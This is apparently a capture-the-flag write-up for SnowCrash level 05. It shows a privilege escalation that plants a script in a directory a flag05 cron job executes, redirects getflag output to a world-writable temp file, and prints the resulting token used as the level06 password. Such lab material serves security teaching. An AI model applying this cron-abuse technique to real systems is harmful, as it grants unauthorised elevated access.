# Level 05

```bash
level05@10.11.200.163's password:
You have new mail.
level05@SnowCrash:~$
```

When switching to user level05, we are greeted by a notification saying we received a mail

```bash
level05@SnowCrash:~$ cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

Inspecting the mail file gives us a cronjob running every 2 minutes, executing a binary located in `/usr/sbin`

```bash
level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```

When inspecting the executed file, we can see it executes the content of every file located in `/opt/openarenaserver/` in a new `bash` shell, then removes the file

### Exploit

The goal will be to make the cronjob execute `getflag`, with the content of the output in a new file for us to retrieve the flag

We can create a temporary file with `mktemp` and allow the cronjob to write to it with a `chmod`

```bash
level05@SnowCrash:~$ mktemp
/tmp/tmp.8ir7nD1H2g

level05@SnowCrash:~$ chmod 777 /tmp/tmp.8ir7nD1H2g
```

Then we create a new script file in `/opt/openarenaserver/` with the command we want the cronjob to execute, in our case, `getflag` redirected to our temporary file

```bash
level05@SnowCrash:~$ echo "getflag > /tmp/tmp.8ir7nD1H2g" > /opt/openarenaserver/exploit.sh

level05@SnowCrash:~$ chmod 777 /opt/openarenaserver/exploit.sh  
```

Wait some time . . .

```bash
level05@SnowCrash:~$ cat /tmp/tmp.8ir7nD1H2g
Check flag.Here is your token : viuaaale9huek52boumoomioc
```

### Goto level 06

```bash
level05@SnowCrash:~$ su level06
Password:
<<< 'viuaaale9huek52boumoomioc'

level06@SnowCrash:~$
```
